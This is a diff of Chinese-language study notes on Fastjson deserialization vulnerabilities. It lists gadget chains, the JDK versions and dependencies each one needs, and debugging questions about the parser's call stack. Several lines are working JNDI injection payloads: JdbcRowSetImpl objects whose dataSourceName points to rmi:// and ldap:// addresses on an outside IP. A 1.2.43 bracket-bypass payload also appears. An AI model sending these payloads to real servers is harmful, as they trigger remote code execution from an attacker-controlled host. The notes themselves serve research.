@@ -1,10 +1,60 @@
+# fastjson全教程
 https://www.rc.sb/fastjson/#fastjson1280
 https://y4er.com/posts/fastjson-learn
 https://paper.seebug.org/994/
+## fastjson1.2.80 poc
+https://github.com/YoungBear/FastjsonPoc
 
-# Fastjson <= 1.2.24
-TemplatesImpl
-JdbcRowSetImpl
+# 工具
+## fastjson-blacklist(hash解码)
+https://github.com/LeadroyaL/fastjson-blacklist
+
+# poc
+## 1.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+常规的Java字节码的执行，但是需要开启Feature.SupportNonPublicField，比较鸡肋
+## 2.com.sun.rowset.JdbcRowSetImpl
+用到的是JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，在目标没外网的情况下无法直接利用
+### 低版本jdk-rmi协议
+6u132, 7u122, 8u113之前
+String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
+### 低版本jdk-ldap协议
+6u211, 7u201, 8u191, 11.0.1之前
+String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"ldap://47.95.7.37:1389/Calc", "autoCommit":true}";
+### 高版本jdk
+开启 TomcatBeanFactoryServer 绑定恶意类到registry, 无需外部获取Factory, 利用本地tomcat依赖中的Factory
+String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
+受害者本地需要有下面依赖
+```text
+<dependency>
+    <groupId>org.apache.tomcat</groupId>
+    <artifactId>tomcat-catalina</artifactId>
+    <version>8.5.0</version>
+</dependency>
+```
+并且需要如下任选其一作为BeanFactory加载的类, 来执行其中的eval表达式
+```text
+<dependency>
+    <groupId>org.apache.el</groupId>
+    <artifactId>com.springsource.org.apache.el</artifactId>
+    <version>7.0.26</version>
+</dependency>
+<dependency>
+    <groupId>org.codehaus.groovy</groupId>
+    <artifactId>groovy-all</artifactId>
+    <version>1.5.0</version>
+</dependency>
+```
+## 3.org.apache.tomcat.dbcp.dbcp2.BasicDataSource
+一个字节码的利用，但其无需目标额外开启选项，也不用连接外部服务器，利用条件更低
+受害者本地需要有下面依赖, 并且jdk版本小于8u251, 版本限制是因为过高bcel无法使用
+```text
+<dependency>
+    <groupId>org.apache.tomcat</groupId>
+    <artifactId>tomcat-dbcp</artifactId>
+    <version>9.0.8</version>
+</dependency>
+```
+
 
 # 疑问
 1.TestDeSerialization中为什么会调用一次getter -> getProp2_2() is called
@@ -46,7 +96,7 @@ parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
 parse:137, JSON (com.alibaba.fastjson)
 parse:193, JSON (com.alibaba.fastjson)
 parseObject:197, JSON (com.alibaba.fastjson)
-main:78, FastJsonLE1224
+main:78, FastJson1_LE1224
 
 
 5._tfactory为什么为{}？
@@ -61,5 +111,14 @@ com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.createJavaBeanDe
 6.getOutputProperties()
 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:599
 
+7.a
+1.2.43如何调试出使用如下绕过?
+{
+"@type": "[com.sun.rowset.JdbcRowSetImpl"[{
+"dataSourceName": "xxx",
+"autoCommit": true
+}
 
 
+# 遇到的问题
+多个版本的fastjson存在于External Libraries的时候无法运行调试
